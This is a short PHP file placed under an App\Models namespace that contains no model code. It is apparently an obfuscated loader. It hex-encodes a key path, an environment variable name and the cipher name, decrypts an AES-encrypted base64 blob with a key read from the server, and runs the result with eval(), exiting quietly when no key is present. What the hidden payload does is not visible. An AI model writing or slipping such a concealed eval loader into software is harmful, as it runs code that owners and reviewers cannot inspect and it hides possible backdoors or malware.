<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('4Aj9v3jTW1RdnLvtXUSLxQ==');

$c=base64_decode(

'G3Je7YDwnGcewhjlwP/Ki1sMKRkOMNp6oyacN3hPX2M3kCyzOUARd2EOFW1JZoWAn48cXVBKjUuQ' .
'aDwDKSyZ7HAzfYsxL0p8vqaPEG5sF8ySZx5hffPB8ZQKT5KJyvag98j/kz6vO9PmvLZlARw3puP8' .
'e7lhT80aKjXMzc1S/1XfQ2oKwM/4gNAl2+W8cZe5U5bxnv49P+eAXuTZe9RA0s/4w2S3P2pkyWvM' .
'LC6QwggD8lRoTSZmDyoW6pDlENTJyfofFmKndjjc+gNTaofHqEtu4LV1TKECAGJ4CWrp4dgfcDH9' .
'yqcklcPB4VxDwYGReFaLgeSFDFS+9LjyymAuhlEA+z2HAgPkDHGm+/LSK12EwaOCWEMXV1gzWUCA' .
'g0FMTLYOwzU/wgDkVIBB7UxnSfFcrrnTKnHPvn5TmLZ0BA4H/72E6nkc1iPYnB/j/FiRcDPl4vMv' .
'kUXaZ4MPiDAmz8zgdTI2DUwT5vCLLUtrxRJLFGQM/UYVX1BCK0DkxWLmt1zvDNFmMkejuLgcYK/y' .
'iiFu+LDlDubzW6mEdrctKKefA6m7/r7RPbihjL11LEqtPUygOrSPjN13M5l62qtmHNud3Lb/cshP' .
'q/nXU4nuPBardQ0Pel61XoteSpL/pRMaSvh4hzbeh6HrSNfEm+bJ9Hpfer79sbObcSiOc2xVtxTQ' .
'2ciXbQVl/EDzcCWCQqu8IGjE0wI584je+N8FOngc5nIoup9saK49Cm0X8/D4S4zcUpf6ApdeB0AW' .
'JLvLxNQ13YXIqG0nJzNAaUvBC8xJSIsem40+Vn5YtxGszds8iVrziyhyRgqdlOft8es04DaSMw+b' .
'hbTgDFUA+RyFOJchr7HHJPrd2GJDFgIVYC6AlEVuFDheXfE5LKwZ1W9hpBIbt70K/mhgp0x5gB0s' .
'g0JGYg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

